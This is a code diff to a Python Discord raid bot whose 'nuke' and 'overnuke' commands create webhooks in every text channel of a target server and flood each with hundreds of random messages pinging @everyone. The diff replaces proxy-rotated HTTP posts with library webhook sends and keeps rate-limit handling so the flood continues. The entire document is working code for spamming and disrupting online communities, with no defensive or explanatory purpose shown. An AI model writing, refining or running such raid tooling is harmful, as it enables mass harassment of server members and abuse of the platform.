@@ -1176,31 +1176,24 @@ async def nuke(ctx, server: str = None):
                 except:
                     break
             text_channels = nuke_channels
-        async def spam_channel(channel, lines):
+        async def spam_channel(channel):
             try:
                 webhook = await channel.create_webhook(name="vvnk")
-                webhook_url = webhook.url
-                async with aiohttp.ClientSession() as session:
-                    await session.post(webhook_url, json={"content": "@everyone"})
-                    for line in lines:
-                        proxy_url = get_random_proxy() if proxy_list else None
-                        try:
-                            kwargs = {"json": {"content": line}}
-                            if proxy_url:
-                                kwargs["proxy"] = proxy_url
-                            async with session.post(webhook_url, **kwargs) as resp:
-                                if resp.status == 429:
-                                    rotate_delay = random.uniform(PROXY_ROTATE_MIN, PROXY_ROTATE_MAX)
-                                    await asyncio.sleep(rotate_delay)
-                        except:
-                            pass
-                        await asyncio.sleep(0.05)
+                await webhook.send(content="@everyone")
+                for _ in range(300):
+                    line = random.choice(nhay_list)
+                    try:
+                        await webhook.send(content=line)
+                    except discord.HTTPException as e:
+                        if e.status == 429:
+                            retry_after = e.retry_after or 2
+                            await asyncio.sleep(retry_after)
+                    except:
+                        pass
+                    await asyncio.sleep(0.05)
             except Exception as e:
                 print(f"Lỗi {channel.name}: {e}")
-        tasks = []
-        for channel in text_channels:
-            lines = [random.choice(nhay_list) for _ in range(300)]
-            tasks.append(spam_channel(channel, lines))
+        tasks = [spam_channel(ch) for ch in text_channels]
         await asyncio.gather(*tasks)
         await ctx.send(f"# __{__NAME__}__\n **Nuked {guild.name} - {len(text_channels)} kenh, 300 dong/kenh**")
     except discord.Forbidden:
@@ -1229,31 +1222,23 @@ async def overnuke(ctx, server: str = None):
             return
         await ctx.send(f"# __{__NAME__}__\n **Đang overnuke: {guild.name}...**")
         text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
-        async def spam_channel(channel, lines):
+        async def spam_channel(channel):
             try:
                 webhook = await channel.create_webhook(name="vvnk")
-                webhook_url = webhook.url
-                async with aiohttp.ClientSession() as session:
-                    await session.post(webhook_url, json={"content": "@everyone"})
-                    for line in lines:
-                        proxy_url = get_random_proxy() if proxy_list else None
-                        try:
-                            kwargs = {"json": {"content": line}}
-                            if proxy_url:
-                                kwargs["proxy"] = proxy_url
-                            async with session.post(webhook_url, **kwargs) as resp:
-                                if resp.status == 429:
-                                    rotate_delay = random.uniform(PROXY_ROTATE_MIN, PROXY_ROTATE_MAX)
-                                    await asyncio.sleep(rotate_delay)
-                        except:
-                            pass
-                        await asyncio.sleep(0.05)
+                for _ in range(150):
+                    line = random.choice(nhay_list)
+                    try:
+                        await webhook.send(content=f"@everyone {line}")
+                    except discord.HTTPException as e:
+                        if e.status == 429:
+                            retry_after = e.retry_after or 2
+                            await asyncio.sleep(retry_after)
+                    except:
+                        pass
+                    await asyncio.sleep(0.05)
             except Exception as e:
                 print(f"Lỗi {channel.name}: {e}")
-        tasks = []
-        for channel in text_channels:
-            lines = [random.choice(nhay_list) for _ in range(150)]
-            tasks.append(spam_channel(channel, lines))
+        tasks = [spam_channel(ch) for ch in text_channels]
         await asyncio.gather(*tasks)
         await ctx.send(f"# __{__NAME__}__\n **Overnuked {guild.name} - {len(text_channels)} kenh, 150 dong/kenh**")
     except discord.Forbidden:
